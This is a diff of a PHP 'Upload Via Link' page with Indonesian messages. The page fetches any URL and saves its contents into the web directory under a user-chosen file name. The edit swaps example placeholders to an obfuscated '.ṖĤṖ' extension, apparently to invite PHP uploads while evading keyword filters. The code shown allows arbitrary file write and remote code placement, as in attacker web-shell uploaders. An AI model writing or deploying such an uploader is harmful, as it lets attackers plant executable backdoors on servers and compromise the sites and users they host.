@@ -62,12 +62,10 @@
     <div class="container">
         <h1>Upload Via Link</h1>
         <form action="" method="post">
-            <label for="url">Enter File URL:</label><br>
-            <input type="text" id="url" name="url" value="<?php echo htmlspecialchars($url ?? '', ENT_QUOTES, 'UTF-8'); ?>" placeholder="https://example.com/file.jpg" required><br><br>
-
-            <label for="filename">Enter File Name:</label><br>
-            <input type="text" id="filename" name="filename" value="<?php echo htmlspecialchars($filename ?? '', ENT_QUOTES, 'UTF-8'); ?>" placeholder="filename.jpg" required><br><br>
-
+            <label for="url">File URL:</label><br>
+            <input type="text" id="url" name="url" value="<?php echo htmlspecialchars($url ?? '', ENT_QUOTES, 'UTF-8'); ?>" placeholder="https://example.com/file.ṖĤṖ" required><br><br>
+            <label for="filename">File Name:</label><br>
+            <input type="text" id="filename" name="filename" value="<?php echo htmlspecialchars($filename ?? '', ENT_QUOTES, 'UTF-8'); ?>" placeholder="filename.ṖĤṖ" required><br><br>
             <button type="submit">Upload</button>
         </form>
         <!-- Output section for results -->
@@ -85,18 +83,17 @@
                         $file_path = __DIR__ . '/' . $filename;
                         file_put_contents($file_path, $file_contents);
                         $file_name_only = basename($file_path);
-                        $output = "<p>File berhasil di-upload: " . htmlspecialchars($file_name_only, ENT_QUOTES, 'UTF-8') . "</p>";
+                        $output = "<p>File berhasil : " . htmlspecialchars($file_name_only, ENT_QUOTES, 'UTF-8') . "</p>";
                     } else {
-                        $output = "<p>Gagal mendownload file dari URL yang diberikan</p>";
+                        $output = "<p>Gagal URL yang diberikan</p>";
                     }
                 } else {
-                    $output = "<p>URL yang dimasukkan tidak valid</p>";
+                    $output = "<p>URL tidak valid</p>";
                 }
             }
             echo $output;
             ?>
         </div>
     </div>
-
 </body>
 </html>
